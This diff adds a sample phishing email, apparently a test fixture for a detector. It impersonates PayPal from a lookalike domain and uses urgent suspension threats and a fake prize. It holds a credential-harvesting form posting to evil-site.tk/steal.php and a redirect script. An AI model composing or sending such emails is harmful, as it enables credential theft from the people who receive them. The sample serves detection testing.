@@ -1,0 +1,48 @@
+From: security@paypa1-verify.com
+To: victim@example.com
+Subject: URGENT: Verify Your Account NOW!!!
+Date: Mon, 1 Jan 2024 23:45:00 +0000
+Message-ID: <urgent123@suspicious-domain.tk>
+Return-Path: <noreply@different-domain.xyz>
+X-Mailer: Python/3.8
+MIME-Version: 1.0
+Content-Type: text/html; charset=UTF-8
+
+<html>
+<body>
+<h1>URGENT SECURITY ALERT!</h1>
+
+<p><b>Your account has been suspended due to unusual activity!</b></p>
+
+<p>Dear User,</p>
+
+<p>We have detected suspicious activity on your account. Your account will be permanently suspended within 24 hours unless you verify your identity immediately.</p>
+
+<p><font color="red">ACT NOW!</font> Click the link below to verify your account:</p>
+
+<p><a href="http://192.168.1.100/phishing/verify.php">http://192.168.1.100/phishing/verify.php</a></p>
+
+<p>Failure to verify will result in permanent account closure and loss of all funds.</p>
+
+<p><b>CONGRATULATIONS!</b> You have also been selected as a winner of our $1,000,000 prize! Click here to claim your prize immediately!</p>
+
+<p>Urgent! Verify! Act Now! Limited Time! Winner! Free Money! Click Here!</p>
+
+<form action="http://evil-site.tk/steal.php" method="post">
+    <input type="text" name="username" placeholder="Username">
+    <input type="password" name="password" placeholder="Password">
+    <input type="submit" value="Verify Now">
+</form>
+
+<script>
+// Malicious script
+window.location = "http://evil-site.tk/phishing";
+</script>
+
+<p>Best regards,<br>
+Security Team<br>
+paypa1-verify.com</p>
+
+</body>
+</html>
+
